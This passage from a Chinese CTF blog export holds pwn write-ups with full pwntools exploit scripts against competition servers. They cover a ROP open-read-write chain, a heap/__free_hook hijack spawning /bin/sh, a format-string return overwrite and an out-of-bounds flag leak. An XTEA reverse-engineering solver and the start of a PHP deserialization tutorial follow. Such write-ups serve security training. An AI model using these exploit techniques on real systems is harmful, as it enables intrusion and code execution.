class="number">8</span>)</span><br><span class="line">add(<span class="number">0x88</span>, pld)</span><br><span class="line">leak_stack = uu64()</span><br><span class="line">lg(<span class="string">&#x27;leak_stack&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x128</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0xc8</span> + p64(<span class="number">0x111</span>) + p64((leak_stack - <span class="number">0x148</span>) ^ key))</span><br><span class="line">add(<span class="number">0x108</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;b *$rebase(0x00000000000018EE)&#x27;)</span></span><br><span class="line"></span><br><span class="line">orw = <span class="string">b&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line">orw += p64(libc_base + <span class="number">0x000000000002a3e5</span>) + p64(leak_stack - <span class="number">0x148</span>)</span><br><span class="line">orw += p64(libc_base + <span class="number">0x000000000002be51</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(libc_base + <span class="number">0x00000000000796a2</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(libc_base + <span class="number">0x0000000000045eb0</span>) + p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(libc_base + <span class="number">0x0000000000091316</span>)</span><br><span class="line"><span class="comment"># orw += p64(libc_base + libc.sym[&#x27;open&#x27;])</span></span><br><span class="line">orw += p64(libc_base + <span class="number">0x000000000002a3e5</span>) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(libc_base + <span class="number">0x000000000002be51</span>) + p64(heap_base + <span class="number">0x100</span>)</span><br><span class="line">orw += p64(libc_base + <span class="number">0x00000000000796a2</span>) + p64(<span class="number">0x50</span>)</span><br><span class="line">orw += p64(libc_base + <span class="number">0x0000000000045eb0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(libc_base + <span class="number">0x0000000000091316</span>)</span><br><span class="line"><span class="comment"># orw += p64(libc_base + libc.sym[&#x27;read&#x27;])</span></span><br><span class="line">orw += p64(libc_base + <span class="number">0x000000000002a3e5</span>) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(libc_base + <span class="number">0x000000000002be51</span>) + p64(heap_base + <span class="number">0x100</span>)</span><br><span class="line">orw += p64(libc_base + <span class="number">0x00000000000796a2</span>) + p64(<span class="number">0x50</span>)</span><br><span class="line">orw += p64(libc_base + <span class="number">0x0000000000045eb0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(libc_base + <span class="number">0x0000000000091316</span>)</span><br><span class="line"><span class="comment"># orw += p64(libc_base + libc.sym[&#x27;write&#x27;])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pld = b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"><span class="comment"># pld += p64(libc_base + 0x000000000002a3e6)</span></span><br><span class="line"><span class="comment"># pld += p64(libc_base + 0x000000000002a3e5) + p64(leak_stack - 0x148)</span></span><br><span class="line"><span class="comment"># pld += p64(libc_base + 0x000000000002be51) + p64(0)</span></span><br><span class="line"><span class="comment"># pld += p64(libc_base + 0x00000000000796a2) + p64(0)</span></span><br><span class="line"><span class="comment"># pld += p64(libc_base + libc.sym[&#x27;system&#x27;])</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x108</span>, orw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="simpleinterpreter"><a href="#simpleinterpreter" class="headerlink" title="simpleinterpreter"></a>simpleinterpreter</h3><p>之前做到过一个类似的，相当于是实现了一个简单的C语言运行器，直接输入C语言就能运行，不过需要注意该运行器能够实现什么功能，这在 sub_3270 核心函数中能看到，通过程序的字符串也能看到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.rodata:0000000000003D38 4C 45 41 20 2C 49 4D 4D 20 2C+aLeaImmJmpCallJ db &#x27;LEA ,IMM ,JMP ,CALL,JZ  ,JNZ ,ENT ,ADJ ,LEV ,LI  ,LC  ,SI  ,SC  ,PUSH,OR  ,XOR ,AND ,EQ  ,NE  ,&#x27;</span><br><span class="line">.rodata:0000000000003D38 4A 4D 50 20 2C 43 41 4C 4C 2C+                              ; DATA XREF: sub_EB0+481↑o</span><br><span class="line">.rodata:0000000000003D38 4A 5A 20 20 2C 4A 4E 5A 20 2C+                              ; sub_3270+16↑o</span><br><span class="line">.rodata:0000000000003D38 45 4E 54 20 2C 41 44 4A 20 2C+db &#x27;LT  ,GT  ,LE  ,GE  ,SHL ,SHR ,ADD ,SUB ,MUL ,DIV ,MOD ,READ,CLOS,PRTF,MALC,FREE,MSET,MCMP,EXIT&#x27;,0</span><br><span class="line">.rodata:0000000000003DF6 00 00                         align 8</span><br></pre></td></tr></table></figure>

<p>除了基本的汇编指令，程序还提供给我们了 read、close、printf、malloc、free、memset、memcmp 函数。泄露地址的方法行不通，因为一次性泄露了地址也做不了，想法是利用堆释放后的残余地址进行构造。<strong>需要注意的是：测试下来发现支持的类型只有 void 和 int，而且各种操作都是以单字节进行的，包括不管指针的类型是什么，取其指向的内容也是以单个字节进行的</strong>。</p>
<p>Exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process(&quot;./simpleinterpreter&quot;)</span></span><br><span class="line">sh = remote(<span class="string">&quot;101.200.122.251&quot;</span>, <span class="number">13410</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">pld = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">int main()&#123;</span></span><br><span class="line"><span class="string">	void *ptr;</span></span><br><span class="line"><span class="string">	void *a;</span></span><br><span class="line"><span class="string">	void *b;</span></span><br><span class="line"><span class="string">	void *c;</span></span><br><span class="line"><span class="string">	void *fake;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	ptr = malloc(0x420);</span></span><br><span class="line"><span class="string">	a = malloc(0x20);</span></span><br><span class="line"><span class="string">	b = malloc(0x20);</span></span><br><span class="line"><span class="string">	free(ptr);</span></span><br><span class="line"><span class="string">	free(a);</span></span><br><span class="line"><span class="string">	free(b);</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	// + 0x1c48 __free_hook</span></span><br><span class="line"><span class="string">	// - 0x39c880 system</span></span><br><span class="line"><span class="string">	*ptr = *ptr + 0x48;</span></span><br><span class="line"><span class="string">	*(ptr + 1) = *(ptr + 1) + 0x1c;</span></span><br><span class="line"><span class="string">	*(ptr + 8) = *(ptr + 8) + 0x80;</span></span><br><span class="line"><span class="string">	*(ptr + 9) = *(ptr + 9) + 0x38;</span></span><br><span class="line"><span class="string">	*(ptr + 10) = *(ptr + 10) + 0xc6;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	*b = *ptr;</span></span><br><span class="line"><span class="string">	*(b + 1) = *(ptr + 1);</span></span><br><span class="line"><span class="string">	*(b + 2) = *(ptr + 2);</span></span><br><span class="line"><span class="string">	*(b + 3) = *(ptr + 3);</span></span><br><span class="line"><span class="string">	*(b + 4) = *(ptr + 4);</span></span><br><span class="line"><span class="string">	*(b + 5) = *(ptr + 5);</span></span><br><span class="line"><span class="string">	*(b + 6) = *(ptr + 6);</span></span><br><span class="line"><span class="string">	*(b + 7) = *(ptr + 7);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	c = malloc(0x20);</span></span><br><span class="line"><span class="string">	fake = malloc(0x20);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	*fake = *(ptr + 8);</span></span><br><span class="line"><span class="string">	*(fake + 1) = *(ptr + 9);</span></span><br><span class="line"><span class="string">	*(fake + 2) = *(ptr + 10);</span></span><br><span class="line"><span class="string">	*(fake + 3) = *(ptr + 11);</span></span><br><span class="line"><span class="string">	*(fake + 4) = *(ptr + 12);</span></span><br><span class="line"><span class="string">	*(fake + 5) = *(ptr + 13);</span></span><br><span class="line"><span class="string">	*(fake + 6) = *(ptr + 14);</span></span><br><span class="line"><span class="string">	*(fake + 7) = *(ptr + 15);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	// 2f 62 69 6e 2f 73 68</span></span><br><span class="line"><span class="string">	*c = 0x2f;</span></span><br><span class="line"><span class="string">	*(c + 1) = 0x62;</span></span><br><span class="line"><span class="string">	*(c + 2) = 0x69;</span></span><br><span class="line"><span class="string">	*(c + 3) = 0x6e;</span></span><br><span class="line"><span class="string">	*(c + 4) = 0x2f;</span></span><br><span class="line"><span class="string">	*(c + 5) = 0x73;</span></span><br><span class="line"><span class="string">	*(c + 6) = 0x68;</span></span><br><span class="line"><span class="string">	*(c + 7) = 0x00;</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	free(c);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Code size: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(pld)))</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;code to interpret: &#x27;</span>, pld)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="强网先锋"><a href="#强网先锋" class="headerlink" title="强网先锋"></a>强网先锋</h2><h3 id="ez-fmt"><a href="#ez-fmt" class="headerlink" title="ez_fmt"></a>ez_fmt</h3><p>简单的格式化字符串，但是想狂扁出题人，跑了一个下午。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		sh = remote(<span class="string">&quot;47.104.24.40&quot;</span>, <span class="number">1337</span>)</span><br><span class="line">		sh.recvuntil(<span class="string">&#x27;There is a gift for you &#x27;</span>)</span><br><span class="line">		leak_stack = <span class="built_in">int</span>(sh.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line">		success(<span class="string">&#x27;leak_stack: &#x27;</span> + <span class="built_in">hex</span>(leak_stack))</span><br><span class="line">		ret_addr = leak_stack + <span class="number">0x68</span></span><br><span class="line"></span><br><span class="line">		<span class="comment"># gdb.attach(sh, &#x27;b *0x0000000000401262&#x27;)</span></span><br><span class="line">		pld = <span class="string">b&#x27;%1c%9$hhn%60298c%10$hn&#x27;</span>.ljust(<span class="number">0x18</span>, <span class="string">b&#x27;a&#x27;</span>) + p64(ret_addr) + p64(ret_addr+<span class="number">1</span>)</span><br><span class="line">		sh.send(pld)</span><br><span class="line"></span><br><span class="line">		sh.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">		sh.sendline(<span class="string">&#x27;cat /flag&#x27;</span>)</span><br><span class="line">		txt = sh.recvrepeat(timeout=<span class="number">0.5</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">b&#x27;&#123;&#x27;</span> <span class="keyword">in</span> txt <span class="keyword">and</span> <span class="string">b&#x27;&#125;&#x27;</span> <span class="keyword">in</span> txt:</span><br><span class="line">			<span class="built_in">print</span>(txt)</span><br><span class="line">			sh.interactive()</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			sh.close()</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">		sh.close()</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		sh.close()</span><br><span class="line">		<span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<h3 id="tire"><a href="#tire" class="headerlink" title="tire"></a>tire</h3><p>漏洞点出现在 View 中的 search 函数产生了数组越界，导致 end 数组可以访问到flag的四个字节，然后以IP的格式输出给我们。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">search</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = trie[<span class="number">2</span> * v3 + (a1 &amp; <span class="number">1</span>)];</span><br><span class="line">    a1 &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v3 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> end[v3];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而如何控制变量 v3 使得数组产生越界，那么就需要添加路由表时进行构造， 在 insert 函数中可以发现 trie 数组里的值是由 tot 全局变量进行控制的，这样就清楚了，tot 就是我们需要越界的偏移量，只要控制 tot 的值大于 64 就能够访问到flag。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_int64 __fastcall <span class="title function_">insert</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> destip, <span class="type">unsigned</span> <span class="type">int</span> nexthop)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !trie[<span class="number">2</span> * v4 + (destip &amp; <span class="number">1</span>)] )</span><br><span class="line">      trie[<span class="number">2</span> * v4 + (destip &amp; <span class="number">1</span>)] = ++tot;</span><br><span class="line">    v4 = trie[<span class="number">2</span> * v4 + (destip &amp; <span class="number">1</span>)];</span><br><span class="line">    destip &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  result = nexthop;</span><br><span class="line">  end[v4] = nexthop;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process(&quot;./trie&quot;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">ip</span>):</span><br><span class="line">	sh = remote(<span class="string">&quot;47.104.150.173&quot;</span>, <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line">	sh.sendlineafter(<span class="string">&#x27;4. Quit.\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">&#x27;Input destination IP:\n&#x27;</span>, <span class="string">b&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">&#x27;Input the next hop:\n&#x27;</span>, <span class="string">b&#x27;10.10.10.10&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	sh.sendlineafter(<span class="string">&#x27;4. Quit.\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">&#x27;Input destination IP:\n&#x27;</span>, <span class="string">b&#x27;255.255.255.255&#x27;</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">&#x27;Input the next hop:\n&#x27;</span>, <span class="string">b&#x27;10.10.10.10&#x27;</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">&#x27;4. Quit.\n&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	sh.sendlineafter(<span class="string">&#x27;4. Quit.\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">&#x27;Input destination IP:\n&#x27;</span>, ip)</span><br><span class="line">	sh.sendlineafter(<span class="string">&#x27;Input the next hop:\n&#x27;</span>, <span class="string">b&#x27;10.10.10.10&#x27;</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">&#x27;4. Quit.\n&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	sh.sendlineafter(<span class="string">&#x27;4. Quit.\n&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">&#x27;Input destination IP:\n&#x27;</span>, ip)</span><br><span class="line">	sh.recvuntil(<span class="string">&#x27;The next hop is &#x27;</span>)</span><br><span class="line">	text = sh.recvuntil(<span class="string">b&#x27;\n\n&#x27;</span>)[:-<span class="number">2</span>]</span><br><span class="line">	success(text)</span><br><span class="line"></span><br><span class="line">	ip = text.decode(<span class="string">&#x27;utf-8&#x27;</span>).split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">	<span class="built_in">print</span>(ip)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> ip[::-<span class="number">1</span>]:</span><br><span class="line">		<span class="keyword">global</span> flag</span><br><span class="line">		flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(i, <span class="number">10</span>))</span><br><span class="line"></span><br><span class="line">	sh.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">		binstr = <span class="string">&#x27;1&#x27;</span> * i + <span class="string">&#x27;0&#x27;</span> * (<span class="number">8</span>-i)</span><br><span class="line">		fip = <span class="built_in">str</span>(<span class="built_in">int</span>(binstr, <span class="number">2</span>)) + <span class="string">&#x27;.0.0.0&#x27;</span></span><br><span class="line">	</span><br><span class="line">		pwn(fip)</span><br><span class="line">		success(fip)</span><br><span class="line">		success(flag)</span><br><span class="line">		sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">		binstr = <span class="string">&#x27;1&#x27;</span> * i + <span class="string">&#x27;0&#x27;</span> * (<span class="number">8</span>-i)</span><br><span class="line">		fip = <span class="string">&#x27;0.&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">int</span>(binstr, <span class="number">2</span>)) + <span class="string">&#x27;.0.0&#x27;</span></span><br><span class="line"></span><br><span class="line">		pwn(fip)</span><br><span class="line">		success(fip)</span><br><span class="line">		success(flag)</span><br><span class="line">		sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h3 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h3><p>简单的逆向题，tea加密，不过在进入主函数之前对密钥和密文都做了转换，而且开了反调试，我是通过附加进程的方式调试的数据，可以绕过反调试。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> key[] = &#123;<span class="number">0x62</span>, <span class="number">0x6f</span>, <span class="number">0x6d</span>, <span class="number">0x62</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">xteade</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *v1, <span class="type">unsigned</span> <span class="type">int</span> *v2)</span>&#123;</span><br><span class="line">    <span class="comment">// printf(&quot;0x%x&quot;, 0x90508D47 - 0x77BF7F99*4*33);</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> delta = <span class="number">0xd192c263</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i ++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">33</span>; j ++)&#123;</span><br><span class="line">            delta += <span class="number">0x77BF7F99</span>;</span><br><span class="line">            *v2 -= (((<span class="number">32</span> * *v1) ^ (*v1 &gt;&gt; <span class="number">4</span>)) + *v1) ^ (delta + key[(delta &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">            *v1 -= (((<span class="number">32</span> * *v2) ^ (*v2 &gt;&gt; <span class="number">4</span>)) + *v2) ^ (delta + key[delta &amp; <span class="number">3</span>]) ^ delta;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> ida_chars[] =</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="number">0xE0</span>, <span class="number">0xF2</span>, <span class="number">0x23</span>, <span class="number">0x95</span>, <span class="number">0x93</span>, <span class="number">0xC2</span>, <span class="number">0xD8</span>, <span class="number">0x8E</span>, <span class="number">0x93</span>, <span class="number">0xC3</span>, </span><br><span class="line">    <span class="number">0x68</span>, <span class="number">0x86</span>, <span class="number">0xBC</span>, <span class="number">0x50</span>, <span class="number">0xF2</span>, <span class="number">0xDD</span>, <span class="number">0x99</span>, <span class="number">0x44</span>, <span class="number">0x0E</span>, <span class="number">0x51</span>, </span><br><span class="line">    <span class="number">0x44</span>, <span class="number">0xBD</span>, <span class="number">0x60</span>, <span class="number">0x8C</span>, <span class="number">0xF2</span>, <span class="number">0xAB</span>, <span class="number">0xDC</span>, <span class="number">0x34</span>, <span class="number">0x60</span>, <span class="number">0xD2</span>, </span><br><span class="line">    <span class="number">0x0F</span>, <span class="number">0xC1</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i ++)&#123;</span><br><span class="line">        xteade((<span class="type">unsigned</span> <span class="type">int</span> *)(ida_chars + <span class="number">8</span>*i), (<span class="type">unsigned</span> <span class="type">int</span> *)(ida_chars + <span class="number">4</span> + <span class="number">8</span>*i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, (<span class="type">char</span> *)ida_chars);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>强网杯</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP 反序列化</title>
    <url>/2023/12/14/Web/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><table>
<thead>
<tr>
<th></th>
<th>类的内部</th>
<th>类的子类</th>
<th>类的外部</th>
</tr>
</thead>
<tbody><tr>
<td>public</td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>protected</td>
<td>√</td>
<td>√</td>
<td>×</td>
</tr>
<tr>
<td>private</td>
<td>√</td>
<td>×</td>
<td>×</td>
</tr>
</tbody></table>
<p>Demo演示：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pubstr</span> = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$prostr</span> = <span class="string">&#x27;bbb&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pristr</span> = <span class="string">&#x27;ccc&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nullstr</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$myint</span> = <span class="number">123</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$myfloat</span> = <span class="number">123.123</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mybool</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$myarray</span> = [<span class="string">&#x27;abc&#x27;</span>, <span class="number">345</span>, <span class="literal">true</span>];</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;pubstr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;test&quot;:8:</span><br><span class="line">&#123;s:6:&quot;pubstr&quot;;s:3:&quot;aaa&quot;;</span><br><span class="line">s:9:&quot;*prostr&quot;;s:3:&quot;bbb&quot;;</span><br><span class="line">s:12:&quot;testpristr&quot;;s:3:&quot;ccc&quot;;</span><br><span class="line">s:7:&quot;nullstr&quot;;N;</span><br><span class="line">s:5:&quot;myint&quot;;i:123;</span><br><span class="line">s:7:&quot;myfloat&quot;;d:123.123;</span><br><span class="line">s:6:&quot;mybool&quot;;b:1;</span><br><span class="line">s:7:&quot;myarray&quot;;a:3:</span><br><span class="line">	&#123;i:0;s:3:&quot;abc&quot;;</span><br><span class="line">	i:1;i:345;</span><br><span class="line">	i:2;b:1;&#125;&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>序列化只能序列化成员属性，不序列化成员方法。</li>
<li>protected：变量名前加 %00*%00</li>
<li>private：变量名前加 %00类名%00</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name1</span> = <span class="string">&#x27;pursue&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ben</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name2</span> = <span class="string">&#x27;pursue&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ben = <span class="keyword">new</span> <span class="title function_ invoke__">test1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test2</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:5:&quot;test2&quot;:2:</span><br><span class="line">&#123;s:3:&quot;ben&quot;;O:5:&quot;test1&quot;:1:&#123;s:5:&quot;name1&quot;;s:6:&quot;pursue&quot;;&#125;</span><br><span class="line">s:5:&quot;name2&quot;;s:6:&quot;pursue&quot;;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><ul>
<li><p>__construct()：构造函数，在实例化一个对象的时候调用，<strong>序列化和反序列化不会调用</strong>。</p>
</li>
<li><p>__destruct()：析构函数，在对象的所用引用被删除或者当对象被显示销毁时执行，<strong>序列化不会调用，反序列化得到的对象销毁时调用</strong>。</p>
</li>
<li><p>__sleep()：<strong>序列化之前被调用</strong>，返回一个包含对象中所有应被序列化的变量名称的数组，删除不必要的属性。</p>
</li>
<li><p>__serialize()：当和sleep同时存在时忽略sleep方法。</p>
</li>
<li><p>__wakeup()：<strong>反序列化之前被调用</strong>，预先准备对象需要的资源，返回void。</p>
</li>
<li><p>__unserialize()：当和wakeup同时存在时忽略wakeup方法。</p>
